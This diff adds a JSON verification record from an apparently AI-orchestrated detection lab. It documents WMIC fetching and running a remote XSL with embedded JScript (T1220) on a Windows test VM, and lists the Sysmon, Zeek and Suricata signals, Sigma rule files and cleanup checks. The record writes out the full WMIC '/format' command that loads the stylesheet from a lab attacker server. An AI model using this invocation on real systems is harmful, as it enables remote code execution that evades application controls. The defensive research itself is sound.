@@ -1,0 +1,199 @@
+{
+  "scenario": {
+    "id": "wmic-remote-xsl-marker",
+    "name": "Remote benign XSL script processing through WMIC",
+    "description": "The signed WMIC utility applied a lab-only remote XSL whose embedded JScript launched cmd.exe to write a marker file.",
+    "design": "scenarios.md",
+    "attack_mapping": [
+      "T1220"
+    ]
+  },
+  "environment": {
+    "target": {
+      "vmid": 104,
+      "name": "WIN10-ANALYSIS",
+      "address": "192.168.1.52",
+      "os": "Microsoft Windows 10 Enterprise LTSC Evaluation",
+      "version": "10.0.19044",
+      "architecture": "64-bit",
+      "baseline_snapshot": "win_verify_baseline"
+    },
+    "attacker_file_server": {
+      "vmid": 100,
+      "name": "kalivm",
+      "address": "192.168.1.50",
+      "interface_scope": "vmbr1 lab network only",
+      "server": "Python http.server",
+      "bind": "192.168.1.50",
+      "port": 18082,
+      "external_network_used": false
+    },
+    "nsm": {
+      "vmid": 106,
+      "name": "nsm",
+      "address": "10.9.0.20",
+      "analysis_mode": "offline pcap",
+      "helper": "~/bin/nsm-analyze",
+      "zeek_version": "8.2.1",
+      "suricata_version": "7.0.10",
+      "et_open_alert_rules": 52234
+    },
+    "proxmox_node": "analysis-proxmox",
+    "sensors": [
+      {
+        "name": "Sysmon",
+        "version": "15.21",
+        "service_status": "Running",
+        "config_path": "C:\\Tools\\sysmon-verification.xml",
+        "config_sha256": "5435642464A05B06B0AAD58C04E682336D0FBAA05786179FCA9292EAEA4F6D71",
+        "config_notes": "Verification-grade unfiltered process, network, DNS, file, and registry coverage; LSASS ProcessAccess EID 10 enabled."
+      },
+      {
+        "name": "pktmon",
+        "mode": "full-packet capture",
+        "command": "pktmon.exe start --capture --pkt-size 0 -f C:\\lab\\wmic-xsl-script-processing.etl",
+        "converted_to": "C:\\lab\\wmic-xsl-script-processing.pcapng"
+      }
+    ],
+    "defender": {
+      "real_time_protection_enabled": false,
+      "tamper_protection_enabled": false
+    },
+    "collector": {
+      "path": "C:\\Tools\\collect-run.ps1",
+      "window_start": "2026-08-10T01:46:07.331Z",
+      "window_end": "2026-08-10T01:46:14.378Z",
+      "event_count": 1217
+    }
+  },
+  "tool": {
+    "name": "WMIC.exe",
+    "type": "Microsoft-signed Windows living-off-the-land binary",
+    "source": "Built into the target operating system",
+    "binary": {
+      "path": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "size_bytes": 576512,
+      "sysmon_file_version": "10.0.19041.5794 (WinBuild.160101.0800)",
+      "original_filename": "wmic.exe",
+      "sha256": "DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757",
+      "signature_status": "Valid",
+      "signer": "Microsoft Windows"
+    },
+    "staged_file": {
+      "name": "benign.xsl",
+      "content": "Benign XSL with embedded JScript that launches cmd.exe only to write a marker and returns benign text",
+      "size_bytes": 571,
+      "sha256": "B0390CCFDBC5D4DB943EC83B0FBD8240D959EB4248507D79B3594368414BD970"
+    },
+    "commands": [
+      {
+        "working_directory": "C:\\Windows\\System32",
+        "invocation": "C:\\Windows\\System32\\wbem\\WMIC.exe os get Caption /format:\"http://192.168.1.50:18082/benign.xsl\"",
+        "account": "NT AUTHORITY\\SYSTEM",
+        "privilege": "System integrity",
+        "process_id": 5224,
+        "process_guid": "{d6daef74-2d62-6a79-9400-000000000b00}",
+        "exit_code": 0,
+        "started_at": "2026-08-10T01:46:10.3315182Z",
+        "ended_at": "2026-08-10T01:46:11.3628034Z",
+        "stdout": "benign-wmic-xsl",
+        "marker_path": "C:\\lab\\wmic-xsl-marker.txt",
+        "marker_content": "benign-wmic-xsl-marker",
+        "marker_created": true
+      }
+    ]
+  },
+  "observed_techniques": [
+    {
+      "id": "T1220",
+      "name": "XSL Script Processing",
+      "observation": "WMIC fetched a remote XSL via /format, initialized JScript through ms:script, and spawned cmd.exe from the stylesheet."
+    }
+  ],
+  "observed_signals": {
+    "network": {
+      "status": "observed",
+      "event_id_3": 1,
+      "event_id_22": 0,
+      "pcapng_sha256": "25774880406F4E72DFF6155AE9E4DBAEB911C5BA39416888A9A6954D37CB8FC2",
+      "packet_count": 346,
+      "capture_loss_percent": 0.0,
+      "zeek_http_records": 1,
+      "assessment": "Sysmon linked the TCP connection to WMIC. Zeek and Suricata decoded a successful XSL GET with the legacy MSIE 7.0/Trident 7.0 User-Agent. DNS was absent because the URL used an IP literal."
+    },
+    "files": {
+      "status": "observed",
+      "event_id_11_relevant": 3,
+      "event_id_23_relevant": 1,
+      "assessment": "WMIC cached the XSL under the SYSTEM INetCache. Two script invocations wrote the same marker, producing two creates and one overwrite-delete event."
+    },
+    "registry": {
+      "status": "observed",
+      "event_id_12_relevant": 15,
+      "event_id_13_relevant": 13,
+      "event_id_14_relevant": 0,
+      "assessment": "The strongest registry signal was JScriptSetScriptStateStarted beneath Windows Script telemetry for wmic.exe; generic WMI, Internet Settings, and notification writes were not promoted alone."
+    },
+    "process_identity": {
+      "status": "observed",
+      "event_id_1": 1,
+      "assessment": "Sysmon captured WMIC identity, remote /format XSL URL, hashes, SYSTEM user, and System integrity."
+    },
+    "parent_child": {
+      "status": "observed",
+      "assessment": "PowerShell launched WMIC through the controlled wrapper. The XSL transform caused WMIC to launch cmd.exe twice; conhost.exe was also a normal child."
+    }
+  },
+  "evidence": [
+    {
+      "path": "evidence/endpoint-signals.json",
+      "event_ids": [1, 3, 5, 11, 12, 13, 23],
+      "description": "Sanitized process, ancestry, endpoint network, file, and registry fields."
+    },
+    {
+      "path": "evidence/network-signals.json",
+      "description": "Sanitized full-packet capture metadata and Zeek/Suricata HTTP findings."
+    }
+  ],
+  "sigma": [
+    {"path": "sigma/win_process_creation_wmic_remote_xsl.yml", "tier": 1, "role": "primary", "logsource": "windows/process_creation", "status": "experimental"},
+    {"path": "sigma/win_process_creation_wmic_xsl_spawns_shell.yml", "tier": 1, "role": "parent-child", "logsource": "windows/process_creation", "status": "experimental"},
+    {"path": "sigma/network_zeek_wmic_remote_xsl.yml", "tier": 1, "role": "network", "logsource": "zeek/http", "status": "experimental"},
+    {"path": "sigma/network_suricata_wmic_remote_xsl.yml", "tier": 1, "role": "network", "logsource": "suricata/http", "status": "experimental"},
+    {"path": "sigma/win_file_event_wmic_xsl_cache.yml", "tier": 1, "role": "file", "logsource": "windows/sysmon/file_event", "status": "experimental"},
+    {"path": "sigma/win_registry_set_wmic_jscript_telemetry.yml", "tier": 2, "role": "registry-depth", "logsource": "windows/sysmon/registry_set", "status": "experimental"}
+  ],
+  "validation": {
+    "pysigma": "All six Sigma rules parsed successfully with pySigma 1.5.0 on 2026-08-10.",
+    "json": "verification.json and both sanitized evidence JSON files passed JSON validation on 2026-08-10."
+  },
+  "sanitization": {
+    "raw_pcap_committed": false,
+    "raw_evtx_committed": false,
+    "raw_event_export_committed": false,
+    "raw_nsm_logs_committed": false,
+    "host_data_committed": false,
+    "notes": "Only selected telemetry fields, hashes, timestamps, aggregate counts, lab topology values, and benign marker content are committed."
+  },
+  "cleanup_confirmation": {
+    "attacker": {
+      "confirmed_at": "2026-08-10T01:47:32.506071416Z",
+      "http_service": "inactive",
+      "served_directory_present": false,
+      "port_18082_listener_present": false
+    },
+    "target": {
+      "snapshot": "win_verify_baseline",
+      "rollback_task_exit": "OK",
+      "confirmed_at": "2026-08-10T01:59:57.9788856Z",
+      "sysmon_service": "Running",
+      "sysmon_config_sha256": "5435642464A05B06B0AAD58C04E682336D0FBAA05786179FCA9292EAEA4F6D71",
+      "defender_real_time_protection_enabled": false,
+      "marker_present": false,
+      "pcap_present": false,
+      "telemetry_directory_present": false
+    }
+  },
+  "verified_at": "2026-08-10T01:46:11.3628034Z",
+  "verifier": "Codex lab orchestrator"
+}
